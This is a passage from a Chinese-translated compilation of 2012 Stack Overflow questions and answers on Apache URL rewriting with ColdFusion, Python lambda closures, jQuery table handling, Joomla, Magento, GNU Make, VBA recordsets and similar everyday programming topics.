    // item can't be deleted now
    return NO;
} 
```

![一](../Images/903acd9a3d8151208b9e8720cca78482.png) ![二](../Images/961b8e857da46267b4b4a7a308a9ff41.png) ![三](../Images/1182f830a4ad1af03a8ce3b6648fa78d.png)

# apache - 带有 ColdFusion 控制器的 SEO URL？

> ID：12839853
> 
> 赞同：4
> 
> 时间：2012-10-11T12:45:01.617
> 
> 标签：apache, mod-rewrite, coldfusion, friendly-url, seo

快速参考：区域 = 门户类型页面。

我想将旧网址**http://domain.com/long/rubbish/url/blah/blah/index.cfm?id=12345** 重定向到**http://domain.com/area/12345-short-title**

**http://domain.com/area/12345-short-title**应该显示内容。

到目前为止，我已经解决了这个问题，我可以使用 apache 将所有 URL 写入

[http://domain.com/](http://domain.com/) **index.cfm** /long/rubbish/url/blah/blah/index.cfm?id=12345 和 [http://domain.com/](http://domain.com/) **index.cfm** /area/12345-short-title

index.cfm 将提供内容或应用永久重定向，但它需要首先从数据库中获取标题和区域信息。

该网站有 50,000 个页面。对于子域重定向和永久子域以及通过 index.cfm 控制它们的行为方式，我还有其他想法。

基础设施热衷于通过 Apache 重写来做尽可能多的事情，我们怀疑它会更快。但是，如果我们需要获取每个页面的区域和标题信息，我不确定我们是否有这种选择。

有没有人有这方面的经验可以提供输入？

--

需要注意的是，我假设我们必须将网站上使用的所有内部 URL 保留为旧格式。改变所有这些将是一项艰巨的工作。

这意味着所有内部 URL 每次都必须使用永久重定向。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T13:57:26.917

与其将两组 URL 重定向到同一个脚本，为什么不简单地将它们发送到两个不同的脚本呢？

就像这样：

```
RewriteCond ${REQUEST_URI}  !-f
RewriteRule ^\w+/\d+-[\w-]+$ /content.cfm/$0 [L]

RewriteCond ${REQUEST_URI}  !-f
RewriteRule ^.* /redirect.cfm/$0   [L,QSA] 
```

然后，redirect.cfm 可以查找替换 URL 并执行 301 重定向，而 content.cfm 只是提供内容。

[（您尚未指定 CF 的设置方式；您可能需要更新 Jrun/Tomcat/other 配置以支持`/content.cfm/*`和`/redirect.cfm/*`- 它的完成方式与 index.cfm 相同）]

出于性能原因，您仍然希望尽可能避免重定向数据库命中，您可以通过为在 Apache 端执行 301 重定向的每个页面生成重写规则来做到这一点。这可以像在 .htaccess 文件中添加一行一样简单，如下所示：

```
<cfset NewLine = 'RewriteRule #ReEscape(OldUrl)# #NewUrl#   [L,QSA,R=301]' />

<cffile action="append" file="./.htaccess" output=#NewLine# /> 
```

（从数据库中查找了 OldUrl 和 NewUrl。）

您可能还想使用[mod_alias 重定向](http://httpd.apache.org/docs/2.2/mod/mod_alias.html#Redirect)而不是 mod_rewrite RewriteRule 进行调查，其中语法将是`Redirect permanent #OldUrl# #NewUrl#`- 因为 OldUrl 是一个精确的路径匹配，它可能会更快。

*请注意，在完成上述 redirect.cfm 重定向之前*，需要检查这些规则- 如果它们在同一个 .htaccess 中，您不能简单地进行附加，但如果它们在站点的通用 Apache 配置文件中，那么 . htaccess 规则将首先检查。

此外，根据 Sharon 的评论，您应该验证您的 Apache 是否会处理 50k 条规则 - 虽然我已经看到它报告说“数千”个基于正则表达式的 Apache 重写非常好，但可能会有一些限制（或至少需要拆分多个文件）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:30:50.067

如果它们是静态重写，或者如果它们都遵循您可以在 .htaccess 文件中用正则表达式编写的某些规则，则使用 apache 重写只会更快。如果您必须为这些重定向访问数据库，那么在 .htaccess 中执行此操作可能没有意义。

另一种方法是大多数 CMS 用于处理虚拟目录和重定向的方法。站点根目录的 index.cfm 文件处理所有传入请求并返回正确的页面和路径。MURA CMS 使用这种方法（以及 Joomla 和大多数其他方法。）

基本上，您在传入请求中使用 CGI.path_info 变量，在您的数据库中搜索它，并重定向到新路径。像往常一样，Ben Nadel 写了一篇关于如何使用这种方法的文章：[Ben Nadel: Using IIS URL Rewriting And CGI.PATH_INFO With IIS MOD-Rewrite](http://www.bennadel.com/blog/1744-Using-IIS-URL-Rewriting-And-CGI-PATH_INFO-With-IIS-MOD-Rewrite.htm)

但是，如果您愿意，可以使用 .htaccess 从 url 字符串中完全删除“index.cfm”，方法是将所有传入请求重定向到根 URL，并在 .htaccess 中使用如下所示的内容：

```
RewriteEngine On
RewriteCond %{DOCUMENT_ROOT}%{REQUEST_URI} !-d
RewriteRule ^([a-zA-Z0-9-]{1,})/([a-zA-Z0-9/-]+)$ /$1/index.cfm/$2 [PT] 
```

基本上，这会将 http://www.yourdomain.com/your-new-url/ 之类的内容重定向[到](http://www.yourdomain.com/your-new-url/)http://www.yourdomain.com/index.cfm/your-new-url/ [，](http://www.yourdomain.com/index.cfm/your-new-url/)在那里可以按照描述进行处理通过上面的博客文章。用户永远不会看到 index.cfm。

# python - python参考心智谜题中的lambda

> ID：12839855
> 
> 赞同：6
> 
> 时间：2012-10-11T12:45:13.457
> 
> 标签：python, reference, lambda

考虑这个例子

```
def dump(value):
    print value

items = []    
for i in range(0, 2):
    items.append(lambda: dump(i))

for item in items:
    item() 
```

输出：

```
1
1 
```

我怎样才能得到：

```
0
1 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:50:34.420

您可以在 lambda 上使用具有默认值的参数：

```
for i in range(0, 2):
    items.append(lambda i=i: dump(i)) 
```

这是有效的，因为默认值是在定义函数时评估的，而不是在调用它时。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-11T12:50:39.297

您可以使用：

```
for i in range(0, 2):
    items.append(lambda i=i: dump(i)) 
```

捕获的当前值`i`

这是因为默认参数值是在函数创建时评估的，`i`它不是外部变量，而是一个函数参数，它将具有您想要的默认值。

更详细的解释可以在这个[答案](https://stackoverflow.com/a/6036144/63011)中找到。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T01:36:27.017

为了完整起见，您还可以执行以下操作：

```
for i in range(0, 2):
    items.append((lambda i: lambda: dump(i))(i)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:52:02.470

输出值是 i 在函数评估时的值，而不是在其声明时的值。这就是为什么你没有得到想要的结果。

# google-plus - 谷歌加分享使用php

> ID：12839860
> 
> 赞同：1
> 
> 时间：2012-10-11T12:45:40.147
> 
> 标签：google-plus, google-plus-one

是否可以直接使用 PHP 将一些用户活动（一些 url）共享到他的 google+ 帐户（不像共享按钮并且具有弹出窗口或重定向）？

请建议我做同样的最佳实践。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T21:24:59.207

目前，只能使用官方的 Google+ 分享链接，但这会呈现一个弹出窗口。

[https://developers.google.com/+/plugins/share/#sharelink](https://developers.google.com/+/plugins/share/#sharelink)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T03:29:49.033

Google+ 不允许在没有用户直接交互的情况下直接写入用户的信息流。您可以在用户批准您的申请后写入他们的[Google+ 历史记录](https://developers.google.com/+/history/)，然后用户可以选择是否将这些时刻分享到他们的圈子或公开。

Google+ 历史记录仍处于开发者预览阶段。

# javascript - 如何在此脚本中从 JSON 数组加载图像？

> ID：12839861
> 
> 赞同：0
> 
> 时间：2012-10-11T12:45:43.083
> 
> 标签：javascript, arrays, json, image

我试图弄清楚如何从网络服务器加载图像，用于这个 JS 中的数组“logo”。不是一个大的 JS 向导，也无法解决这个问题。

该脚本在检测到更改事件“选择”时动态填充表格单元格并将其写入表格的不同列。仅仅加载一张图片就让我头疼。

整个代码包括表格在[myjsfiddle](http://jsfiddle.net/HammerMan/ddXYt/)

```
var data = {
"details":
    {
    "info": [
        {
        "name": "Prod1",
        "logo": "P1 Logo",
        "d1": "Specs of this",
        "d2": "Some Details",
        "d3": "More text about this",
        "d4": "Even more details here",
        "rating": "3 stars"
        },
    {
        "name": "Prod2",
        "logo": "P2 Logo",
        "d1": "Specs here",
        "d2": "Details go here",
        "d3": "wow, more text",
        "d4": "Even more text and details",
        "rating": "1 stars"
        },
    {
        "name": "Prod3",
        "logo": "P3 Logo",
        "d1": "Specs and stuff",
        "d2": "Details or some other things",
        "d3": "More details go here wow",
        "d4": "Almost forgot - more here",
        "rating": "5 stars"
        },
    {
        "name": "Prod4",
        "logo": "P4 Logo",
        "d1": "Specs, stuff etc",
        "d2": "Some other things",
        "d3": "What should I say",
        "d4": "details go here wow",
        "rating": "4 stars"
        }
    ]}
};

$(".select").change(function() {
var jthis = $(this);
var whichCol;
if (jthis.hasClass("col2")) {
    whichCol = "col2";
} else if
    (jthis.hasClass("col3")) {
    whichCol = "col3";
} else if
(jthis.hasClass("col4")) {
    whichCol = "col4";
}
$.each(data.details.info, function(i, v) {
    if (v.name == jthis.val()) {
        $("td." + whichCol + ".name").html(v.name);
        $("td." + whichCol + ".logo").html(v.logo);
        $("td." + whichCol + ".d1").html(v.d1);
        $("td." + whichCol + ".d2").html(v.d2);
        $("td." + whichCol + ".d3").html(v.d3);
        $("td." + whichCol + ".d4").html(v.d4);
        $("td." + whichCol + ".rating").html(v.rating);
        return;
    }
});

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:49:24.850

假设`v.logo`等于`path/to/logo.png`，这应该有效：

```
$.each(data.details.info, function(i, v) {
    if (v.name == jthis.val()) {
        $("td." + whichCol + ".name").html(v.name);
        $("td." + whichCol + ".logo").html('<img src="' + v.logo + '" alt="' + v.name + '" />');
        $("td." + whichCol + ".d1").html(v.d1);
        $("td." + whichCol + ".d2").html(v.d2);
        $("td." + whichCol + ".d3").html(v.d3);
        $("td." + whichCol + ".d4").html(v.d4);
        $("td." + whichCol + ".rating").html(v.rating);
        return;
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:03:19.193

在 json 对象属性中，logo 应该代表服务器上所需 logo 的 url。如果你有 url，你可以简单地添加 img 标签而不是简单的文本。

例子：

```
$.each(data.details.info, function(i, v) {
if (v.name == jthis.val()) {
    $("td." + whichCol + ".name").html(v.name);
    $("td." + whichCol + ".logo").html("<img src='" + v.logo + "' />");
    $("td." + whichCol + ".d1").html(v.d1);
    $("td." + whichCol + ".d2").html(v.d2);
    $("td." + whichCol + ".d3").html(v.d3);
    $("td." + whichCol + ".d4").html(v.d4);
    $("td." + whichCol + ".rating").html(v.rating);
    return;
}
}); 
```

[在这里](http://jsfiddle.net/ddXYt/15/)你可以看到你的代码的编辑版本。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:00:25.510

您可以在徽标 html 中添加 img 元素

编辑 ：

我做得更好，就像 h2ooooooo 建议的那样：http: [//jsfiddle.net/ddXYt/16/](http://jsfiddle.net/ddXYt/16/)

# java - 在 XML for Java 中创建多个子节点

> ID：12839866
> 
> 赞同：0
> 
> 时间：2012-10-11T12:45:59.917
> 
> 标签：java, xml

我需要在 XML 的一个元素节点中创建多个子节点，我是否只需根据需要添加多个子节点来创建这些节点？像这样：

```
rootElement.appendChild(creator);
creator.appendChild(name);
creator.appendChild(email);
creator.appendChild(name);
creator.appendChild(email); 
```

或者每当我这样做时，java是否会自动创建额外的子节点：

```
name.appendChild(doc.createTextNode("Bob"));
email.appendChild(doc.createTextNode("bob@email.com"));
name.appendChild(doc.createTextNode("Smith"));
email.appendChild(doc.createTextNode("smith@email.com")); 
```

我不太确定它是如何工作的，任何建议或帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:02:47.667

行为因不同的实现而异，但通常您希望使用第二种方法。

当向父级追加或添加子级时，前一个父级将被替换。这意味着第一种方法只会对孩子进行同样的洗牌。第二种方法是正确的，因为您可以随时创建新的子代，而之前添加的子代不会被以后的 API 调用影响。

# javascript - 如何根据每行中的复选框选择获取 HTML 表格行数据？

> ID：12839869
> 
> 赞同：1
> 
> 时间：2012-10-11T12:46:07.157
> 
> 标签：javascript, jquery

我有一个用 java 脚本动态创建的表。它在每一行中都有一个复选框作为第一列。我想根据各行选择的复选框来获取行数据。

```
var table = document.getElementById("myTable");
var row = table.insertRow(0);
var cell0 = row.insertCell(0);
var cell1 = row.insertCell(1);

cell0.innerHTML = 'Select'; 
cell1.innerHTML = 'Epic';
cell0.innerHTML = " checkbox html code ";
cell1.innerHTML = epicSeries[j]; 
```

实际上列太多了，我只放了两个。我在列标题“史诗”下面有很多史诗，每行的第一列有一个复选框。我想要基于选中的复选框的行数据。

抱歉，代码太长了，我不能全部粘贴。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T15:53:03.867

现在有了您的代码示例和更明确的要求，我认为您应该执行以下操作：

```
$('#myTable input[type=checkbox]:checked').each(function() { 

   var row = $(this).parent().parent();
   var rowcells = row.find('td');
   // rowcells contains all td's in the row
   // you can do 
   // rowcells.each(function() {var tdhtml = $(this).html(); }); 
   // to cycle all of them    

}); 
```

如果你有这样的表：

```
<table>
  <tr>
     ....
     <td><input type="checkbox" name="cb1" checked></td>
     ...   
  </tr>
</table> 
```

此代码将返回所有`<tr>`选中的复选框

如果行选择复选框处于更深层次，则应根据`.parent()`需要设置更多

这个例子当然使用了 jQuery。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:52:39.377

这是我在使用 jquery 的情况下使用的：

```
$('.chkbox').click(function(){
    var row = jQuery(this).closest('tr');//your nearest row for the check box

    $(row).each(function(){
        //get all data using the id and use/store it
        $(this).find(".item").html();
    });
}); 
```

对于每个复选框和一行中的每个项目，给出一个类（我用于`chkbox`所有复选框`item`，`price`等等。对于单行的所有项目）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:56:08.157

```
$('table#tableid input[type=checkbox]').each(function() {
   if ($(this).is(':checked')) {
     .... 
   }
}); 
```

我想是这样的

# joomla - Joomla 组件开发：无效的控制器：name=''，format=''

> ID：12839871
> 
> 赞同：6
> 
> 时间：2012-10-11T12:46:14.907
> 
> 标签：joomla, components

我正在尝试从[这里](http://docs.joomla.org/Developing_a_Model-View-Controller_Component/2.5/Basic_backend)开发组件。我在管理部分遇到错误

> 500 - 发生错误。
> 
> 无效的控制器：名称=''，格式=''

如何调试这个？我什至不知道与发布相关的代码。

文件：admin/controller.php

```
// No direct access to this file
defined('_JEXEC') or die('Restricted access');

// import Joomla controller library
jimport('joomla.application.component.controller');

class TestimonialsController extends JController {
    function display($cachable = false) {
        // set default view if not set
        JRequest::setVar('view', JRequest::getCmd('view', 'Testimonials'));

        // call parent behavior
        parent::display($cachable);
    }
} 
```

文件：admin/testimonials.php

```
<?php
// No direct access to this file
defined('_JEXEC') or die('Restricted access');

jimport('joomla.application.component.controller');
$controller = JController::getInstance('Testimonials');
$controller->execute(JRequest::getCmd('task'));
$controller->redirect(); 
```

文件：admin/views/testimonials/view.html.php

```
<?php
// No direct access to this file
defined('_JEXEC') or die('Restricted access');

// import Joomla view library
jimport('joomla.application.component.view');

class TestimonialsViewTestimonials extends JView {
    function display($tpl = null) {
            $items = $this -> get("Items");
            $pagination = $this -> get("Pagination");

            //Check for errors
            if (count($errors = $this->get('Errors'))) 
            {
                JError::raiseError(500, implode('<br />', $errors));
                return false;
            }

            // Assign data to the view
            $this -> items = $items;
            $this -> pagination = $pagination;

            // Display the template
            parent::display($tpl);

    }
} 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-12T09:45:32.850

@mrN：xml 文件呢？您可以验证*<files>*部分是否具有所有存档。

文件丢失时的错误 500 示例：

```
<!-- file testimonials.xml -->
<!-- ERROR 500 because <em>admin/controller.php</em> is not installed -->
...
<administration>
    <!-- Administration Menu Section -->
    <menu>Testimonials</menu>
    <!-- Administration Main File Copy Section -->
    <!-- Note the folder attribute: This attribute describes the folder
         to copy FROM in the package to install therefore files copied
         in this section are copied from /admin/ in the package -->
    <files folder="admin">
    <!-- Admin Main File Copy Section -->
        <filename>index.html</filename>
        <filename>testimonials.php</filename>
        <!-- SQL files section -->
        <folder>sql</folder>
    </files>
</administration>
... 
```

# google-plus - 为什么我无法更改 plusone 按钮上的目标链接？

> ID：12839872
> 
> 赞同：0
> 
> 时间：2012-10-11T12:46:17.780
> 
> 标签：google-plus

我的代码：

```
<script src="http://apis.google.com/js/plusone.js" type="text/javascript"></script>
<g:plusone id="googleModuloContentButton" href="http://www.mywebsite.com/?IDL=1" size="medium"></g:plusone> 
```

它创建了 Google+ 徽章。但是在点击处理程序之后，我会这样做：

```
gapi.plusone.render('googleModuloContentButton', {
    href: "http://www.mywebsite.com/?IDL=2"
}); 
```

+1 的目标链接没有改变……仍然是第一次渲染时设置的链接。为什么？我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T03:25:02.217

您已打开自动渲染。将脚本行更改为：

```
<script type="text/javascript" src="https://apis.google.com/js/plusone.js">
  {parsetags: 'explicit'}
</script> 
```

目前，您的按钮已被告知要渲染。添加上面的参数应该允许您的代码工作。

您也可以考虑以这种方式设置 href 是否是最好的方法，而不是使用规范链接或预填充 href。你的用例是什么？

# jquery - 页面加载后向元素添加类可防止点击

> ID：12839881
> 
> 赞同：0
> 
> 时间：2012-10-11T12:46:42.523
> 
> 标签：jquery

我有一个有 AJAX 调用的页面。在响应中，我使用 .addClass 向其中一个元素添加一个类

```
$("#cq div:first-child").addClass('curCat'); 
```

稍后在我的 JS 代码中，我试图向该元素添加一个点击功能，不幸的是它似乎没有反应

```
$('.curCat').click(function() {
    $('#cq div').show();
}); 
```

我想，这可能是因为我在加载 DOM 后添加了类并尝试使用 delegate() 但无济于事。

在这一点上有点输了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:50:11.310

尝试使用`.live()`

```
$('.curCat').live('click', function() {
    $('#cq div').show();
    $(this).css('border-bottom','1px solid #ccc');
}); 
```

# javascript - 提交内部文本在 xmlHttp.responseText 中的表单

> ID：12839883
> 
> 赞同：1
> 
> 时间：2012-10-11T12:46:44.253
> 
> 标签：javascript, jquery, ajax, jsp, struts

我做了一个struts应用程序。头版是具有表单和图像的jsp。如果您在字段中输入任何数据并单击图像，它将搜索该特定值的详细信息并将其打印在同一页面的 div 中。返回的数据是带有复选框和值的表格形式。这种表格格式位于另一个jsp页面中。我这样做是`Ajax`为了获取所有值并将其显示在同一页面上，因此我不需要一直刷新。

```
`document.getElementById("prtCnt").innerHTML=xmlhttp.responseText;`

where "prnCnt" is the Id of that div. 
```

现在我想检查一些复选框并提交整个表单（表单上已经存在字段以及带有复选框的表值）。

我应该怎么做？

abc.jsp

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
pageEncoding="ISO-8859-1"%>
   <%@taglib uri="/WEB-INF/struts-html" prefix="html"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01     Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
<script src="ajaxjs.js"></script>
</head>
<script>
function getvalue() {
    var value = document.getElementById("client").value;
    loadContent(value);
}
</script>
<body>
<html:form action="AjaxAction.do" >
    <html:text property="client"  value="ankit"  styleId="client" /> <img
        style="cursor: hand" id="search" src="images/1search.gif"  width="15"
        height="15" border="0" onclick="getvalue()">
     </html:form>
 <div id="prtCnt"></div>
 </body>

</html>` 
```

ajaxjs.js

`var xmlhttp; function loadContent(value) { xmlhttp=GetXmlHttpObject(); if (xmlhttp==null) { alert ("Your browser does not support Ajax HTTP"); return; } url="AjaxAction.do?client="+value; xmlhttp.onreadystatechange=getOutput; xmlhttp.open("post",url,true); xmlhttp.send(null); } function getOutput() { if (xmlhttp.readyState==4) { alert(xmlhttp.responseText); document.getElementById("prtCnt").innerHTML=xmlhttp.responseText; } } function GetXmlHttpObject() { if (window.XMLHttpRequest) { return new XMLHttpRequest(); } if (window.ActiveXObject) { return new ActiveXObject("Microsoft.XMLHTTP"); } return null; }`

tableshow.jsp

```
enter code here

<%@page import="com.ajax.AjaxForm"%>
<%
AjaxForm aj = (AjaxForm) request.getAttribute("bean");
%>
<html>
<body>
<table width="99%" border="1" cellspacing="0" cellpadding="0">
<tr align="left" class="tableheader">
<td width="5%">CheckBox</td>
    <td width="10%">Account Number</td>
    <td width="12%">Tax Form ID</td>
    <td width="12%">Account Name</td>
    <td width="12%">Product</td>
    <td width="12%">Bank ID</td>
    <td width="12%">Client ID [ECI]</td>
    <td width="10%">Relationship type</td>
    <td width="5%">LOB</td>
    <td width="10%">Account Status</td>
</tr>
<tr class="GridRow">
<td width="5%"><input type="checkbox" name="check"> </td>
    <td width="10%"><a href=""><%=aj.getDummy()%></a>
    </td>
    <td width="12%"><%=aj.getClient()%></td>
    <td width="12%"><%=aj.getDummy()%></td>
    <td width="12%"><%=aj.getDummy()%></td>
    <td width="12%"><%=aj.getDummy()%></td>
    <td width="12%"><%=aj.getDummy()%></td>
    <td width="10%"><%=aj.getDummy()%></td>
    <td width="5%"><%=aj.getDummy()%></td>
    <td width="10%"><%=aj.getDummy()%></td>
</tr>

</table>
</body>
</html> 
```

`

AjaxAction.java

```
package com.ajax;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;

public class AjaxAction extends Action {
public ActionForward execute(ActionMapping mapping, ActionForm actionForm,
        HttpServletRequest request, HttpServletResponse response)
        throws Exception {
    System.out.println("from action");
    AjaxForm aj = (AjaxForm) actionForm;
    System.out.println(request.getParameter("client"));
    if(aj.getClient()!=null){}
    else
        aj.setClient("ankit");
    //aj.setClient(request.getParameter("client"));

    System.out.println(aj.getClient()+"1111111111111111111111111111111");
    if (aj.getClient().equals("ankit"))
        aj.setDummy("Dummy Value for ankit");
    else if (aj.getClient().equals("arpit"))
        aj.setDummy("Dummy Value for arpit"); 
    else if (aj.getClient().equals("rohit"))
        aj.setDummy("Dummy Value for rohit");
    else{
        aj.setClient("soni");
        aj.setDummy("Dummy Value for soni");
    }
    System.out.println("after setting");
    System.out.println(aj.getClient());
    System.out.println(aj.getDummy());
    request.setAttribute("bean", aj);
    return mapping.findForward("success");
}
} 
```

# matlab - Matlab - 使用 imquantize()

> ID：12839884
> 
> 赞同：1
> 
> 时间：2012-10-11T12:46:46.297
> 
> 标签：matlab

我发现有一种方法`imquantize`可以对输入图像进行量化。我正在尝试使用**4-bits**进行量化。我做了以下事情：

```
>> quan = imquantize(im,16); 
```

但是，我收到以下错误：

```
??? Undefined function or method 'imquantize' for input arguments of type 'unit8' 
```

我该如何解决这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:56:11.560

`imquantize`是[Image Processing Toolbox R2012b](http://www.mathworks.com/help/images/release-notes.html)中引入的新功能。您可以通过调用以下命令检查 matlab 上安装了哪个图像处理工具箱（如果有）：

```
ver 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:56:25.020

`imquantize`是2012b 版图像处理工具箱的[新增功能。](http://www.mathworks.com/products/image/whatsnew.html)因此，如果您没有 2012b（上个月发布），您将没有`imquantize`.

在任何情况下，您的使用`imquantize`都是不正确的。`imquantize`将要用作阈值的级别向量作为第二个参数。例如，这些级别可以通过`multithresh`（这也是 IPT 2012b 的新内容）获得。

# google-maps - 全景层

> ID：12839885
> 
> 赞同：0
> 
> 时间：2012-10-11T12:46:47.827
> 
> 标签：google-maps, panoramio

如果我在 API 文档中遗漏了这一点，我们深表歉意，但其中指出：

“PanoramioLayer 在地图上将来自 Panoramio 的地理标记照片图标图层渲染为一系列大小照片图标”

有什么方法可以控制这一点 - 例如，只显示小图标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T23:53:51.037

无法通过 Google Maps API 控制这一点。

# magento - Magento 从产品页面调用目录/产品列表类型块

> ID：12839890
> 
> 赞同：1
> 
> 时间：2012-10-11T12:47:02.270
> 
> 标签：magento, magento-1.7, product

我正在使用一个简单的自定义块在侧栏中列出来自给定类别的产品。调用时它工作正常

```
<block type="catalog/product_list" before="-" name="product.leftnav" as="product.leftnav" template="catalog/product/training_leftlist.phtml" /> 
```

在*除*产品页面之外的所有页面上，它都会导致错误（我得到了下面有 404 页面的项目页面）。

`type`我应该使用更好的块​​，还是在产品页面上以不同的方式调用它？

模板文件为：

```
<?php
$products = Mage::getModel('catalog/product')
->getCollection()
->addAttributeToSelect('*')
->addAttributeToFilter('status',1)
->addStoreFilter()
->addCategoryFilter(Mage::getModel('catalog/category')->load(12));

$products->setPageSize(4)->setCurPage(1);

$_helper = $this->helper('catalog/output'); 
```

然后用类似的东西打印项目

```
if(count($products>0)) echo "<ul>";
foreach($products as $_product):?>
  <li>
    <h2 class="product-name"><a href="<?php echo $_product->getProductUrl() ?>" title="<?php echo $this->stripTags($_product->getName(), null, true) ?>"><?php echo $_helper->productAttribute($_product, $_product->getName(), 'name') ?></a></h2>
  </li>
<?php endforeach;?>
<?php if(count($products>0)) echo "</ul>";?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T15:09:52.883

结果证明`block type`，每个地方都使用不同的答案。

对于非产品页面

```
<block type="catalog/product_list" before="-" name="product.leftnav" as="product.leftnav" template="catalog/product/training_leftlist.phtml" /> 
```

然后对于产品页面使用`type="catalog/product_list_related"`. 记住也要删除上述内容，*例如*：

```
<catalog_product_view>

    <remove name="product.leftnav" />   

    <!--  Left bar product list-->
    <reference name="left">
    <block type="catalog/product_list_related" before="-" name="product.leftnav.view" as="product.leftnav.view" template="catalog/product/training_leftlist.phtml" />
    </reference>

</catalog_product_view> 
```

# makefile - GNU Make：静态模式规则中的通配符

> ID：12839891
> 
> 赞同：1
> 
> 时间：2012-10-11T12:47:04.373
> 
> 标签：makefile, gnu-make

可以在 GNU make 的静态模式规则上下文中使用通配符吗？例如：

```
$(BUILD_DIR)/$(DEPENDENCIES) : */%.d : $(SOURCE_DIR)/%.c
      ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T12:38:54.440

离开`$(SOURCE_DIR)/%.c`静态模式规则，并在单独的行中输入依赖项。也许：

```
# Tell make "build/f.d: source/f.c" for each source file
$(foreach _,${srcs},$(eval ${BUILD_DIR}/$(notdir $_): $_))

${BUILD_DIR}/${DEPENDENCIES}: ${BUILD_DIR}/%.d:
    ... 
```

这回答了这个问题，尽管我同意@Beta 的观点，即这不是你想要的。

# sql-server - 用于捕获多个 SQL 结果集的 VBA 宏

> ID：12839892
> 
> 赞同：0
> 
> 时间：2012-10-11T12:47:13.103
> 
> 标签：sql-server, vba

我曾多次使用与 SQL Server 相关的 VBA 宏，但它们始终是单个“选择”语句或调用返回单个结果集的存储过程。现在我发现自己正在编写一个宏，该宏将调用一个存储过程，但该存储过程返回多个结果集。宏是否可以捕获每个 SQL 结果集并将其放在不同的工作表上？任何示例和/或指导将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T14:51:56.830

使用 .NextRecordset 很容易做到这一点。

```
Dim rs As ADODB.Recordset, success As Boolean
success = getAResultWith2Recordsets(rs)
If success = False Then
    MsgBox "Unable to records, no data"
    Exit Sub
Else
    Set Me.Recordset = rs ' for example on a report
    Set SecondRs = New ADODB.Recordset ' create empty recordset
    Set SecondRs = rs.NextRecordset ' assign it the next batch result
    Set rs = Nothing
End If 
```

等等。这只是一个示例，您将在[.nextRecordset](http://msdn.microsoft.com/en-us/library/windows/desktop/ms677539%28v=vs.85%29.aspx)的手册中找到所有必要的信息，例如如何迭代它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T15:41:59.073

YMMV；但在大多数情况下，每个查询返回多个记录集违反“最佳实践”，因为它们按序号（0、1、2）返回，因此它不是自记录的。但是，假设您正在编写此代码并且知道记录集的顺序，则类似的方法会起作用。

```
'' ---> Assuming you have logic to execute SQL and place results into a DataSet <--- ''

dt = ds.tables(0)
if dt.rows.count  > 0 then

    '' This datatable as datarows ''
    '' apply logic relevant to specific worksheet ''

end if

dt = ds.tables(1)
if dt.rows.count  > 0 then

    '' This datatable as datarows ''
    '' apply logic relevant to specific worksheet ''

end if

dt = ds.tables(2)
if dt.rows.count  > 0 then

    '' This datatable as datarows ''
    '' apply logic relevant to specific worksheet ''

end if
dt.dispose
ds.dispose 
```

**---> 你也可以迭代数据表集合；但这并不完全优雅。**

```
dim i as integer = 0
for i = 0 to ds.tables.count-1
    dt = ds.tables(i)
    if dt.rows.count> 0 then

        '' Apply worksheet logic here ''

    end if
next 
```

此代码未经测试。

# sql-server - SQL Server 中的数据库常驻连接池

> ID：12839894
> 
> 赞同：0
> 
> 时间：2012-10-11T12:47:23.207 标记“现在”
> 
> 标签：sql-server

SQL Server 是否具有类似于 Oracle 的[数据库驻留连接池](http://www.oracle.com/technetwork/articles/oracledrcp11g-1-133381.pdf)(DRCP) 的功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:55:22.680

不，我相信 DRCP 本身就是 Oracle 11g 的东西，主要有利于基于 PHP 的 Web 应用程序。

但是，使用 C# 或任何其他 .Net 语言编写的 Web 应用程序，具有 Microsoft MSSQL 的 ADO.Net 接口，在 Microsoft IIS Web 服务器上运行，绝对允许连接池，并且应该完成几乎相同的事情 :)

# javascript - 是否可以将这个 javascript 数组声明写得更短？

> ID：12839895
> 
> 赞同：1
> 
> 时间：2012-10-11T12:47:23.947
> 
> 标签：javascript, ecmascript-5

是否可以将这个“单例数组声明”写得更短？有不同的脚本可以添加一些东西，`array`但它们是异步加载的，所以我不知道哪个会`array`先初始化。

```
var array = array || [];
    array.push("foo");

console.debug(array[0]); 
```

我尝试过这样的事情，但这不起作用：

```
(array || []).push("foo"); 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
